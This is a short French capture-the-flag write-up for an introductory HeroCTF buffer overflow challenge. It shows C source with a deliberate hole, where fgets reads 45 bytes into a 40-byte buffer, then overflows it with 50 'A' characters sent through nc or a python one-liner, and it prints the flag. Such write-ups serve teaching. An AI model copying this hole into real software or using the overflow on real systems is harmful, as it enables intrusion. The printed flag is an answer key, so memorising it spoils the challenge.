Ce challenge a pour but d'introduire le concept de Buffer Overflow !

Pour cette introduction, nous avons accès au code source du challenge.
La partie intéressante du code est la suivante :
```c
int check = 0xdeadbeef;
char buf[40];

printf("Déborde moi mon cochon : ");
 
fgets(buf,45,stdin);
 
if (check!= 0xdeadbeef){
  printf ("\nGG wola tu m'as eu\n");
  setreuid(geteuid(), geteuid());
  system("cat flag.txt");
  printf("Voilà ton flag petit fou.\n");
}
```
On comprend donc ici qu'il va falloir overflow le buffer où est stocké l'input (buf) pour aller modifier la valeur du check.
Pour ceci, on entre dans l'input plus de caractères que le buffer ne peut en contenir (40).
50 caractères, par exemple.
```bash
$ nc heroctf.fr 3000
Déborde moi mon cochon : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

GG wola tu m'as eu
HeroCTF{1_l0v3_buff3r_0v3rfl0w_10493}
Voilà ton flag petit fou.
```
Ou en utilisant python :
```bash
$ python -c "print('A'*50)" | nc heroctf.fr 3000
Déborde moi mon cochon : 
GG wola tu m'as eu
HeroCTF{1_l0v3_buff3r_0v3rfl0w_10493}
Voilà ton flag petit fou.
```
HeroCTF{1_l0v3_buff3r_0v3rfl0w_10493}
